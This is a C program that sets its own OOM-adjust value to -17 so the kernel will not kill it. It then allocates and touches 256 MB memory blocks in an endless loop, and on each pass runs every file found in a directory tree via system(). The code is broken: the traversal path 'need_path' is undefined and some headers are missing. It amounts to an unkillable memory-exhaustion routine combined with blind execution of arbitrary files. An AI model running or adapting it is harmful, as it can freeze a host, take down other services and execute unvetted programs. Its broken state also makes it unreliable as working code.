#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <ftw.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/time.h>

#define LOG_FILE "log.txt"
#define START_DIR "/proc"
#define OOM_ADJ_FILE "oom_adj"


static struct timeval startTime, endTime;

static void log_info(const char* format, ...) {
    #ifdef DEBUG
    va_list args;
    va_start(args, format);
    vfprintf(stdout, format, args);
    va_end(args);
    #endif
}

static float time_difference(struct timeval *start, struct timeval *end) {
    return (end->tv_sec - start->tv_sec) + 1e-6 * (end->tv_usec - start->tv_usec);
}

static int write_log(long int availableMemory) {
    FILE *file = fopen(LOG_FILE, "a+");
    if (file == NULL) {
        perror("Error opening log file");
        return -1;
    }
    fprintf(file, "%ld;%0.8f\n", availableMemory, time_difference(&startTime, &endTime));
    fclose(file);
    return 0;
}

static int adjust_oom_priority() {
    int pid = getpid();
    char path[1024];
    sprintf(path, "%s/%d/%s", START_DIR, pid, OOM_ADJ_FILE);

    FILE *file = fopen(path, "w");
    if (file == NULL) {
        perror("Error adjusting OOM priority");
        return -1;
    }

    fprintf(file, "-17");
    fclose(file);
    return 0;
}

static int find_and_execute_program(const char *filePath, const struct stat *statPtr, int flag) {
    (void) statPtr; // Explicitly ignore unused parameter

    if (flag == FTW_F) {
        log_info("Executing: %s\n", filePath);
        system(filePath);
    }
    return 0;
}

int main() {
    gettimeofday(&startTime, NULL);

    long pageSize = sysconf(_SC_PAGESIZE);
    long totalPhysicalPages = sysconf(_SC_PHYS_PAGES);
    long availablePhysicalPages = sysconf(_SC_AVPHYS_PAGES);

    log_info("Page size: %ld bytes\nTotal physical pages: %ld\nAvailable physical pages: %ld\n",
             pageSize, totalPhysicalPages, availablePhysicalPages);

    adjust_oom_priority();

    unsigned long targetMemorySize = 256 * 1024 * 1024; // 256 MB
    char* memory;

    while (1) {
        memory = (char*) mmap(NULL, targetMemorySize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (memory == MAP_FAILED) {
            perror("Memory allocation failed");
            exit(EXIT_FAILURE);
        }

        for (int i = 0; i < targetMemorySize; i += pageSize) {
            memory[i] = 1;
        }

        gettimeofday(&endTime, NULL);
        write_log(availablePhysicalPages * pageSize / 1024 / 1024);

        if (ftw(need_path, find_and_execute_program, 20) == -1) {
            perror("Error traversing directories");
            exit(EXIT_FAILURE);
        }
    }

    return 0;
}
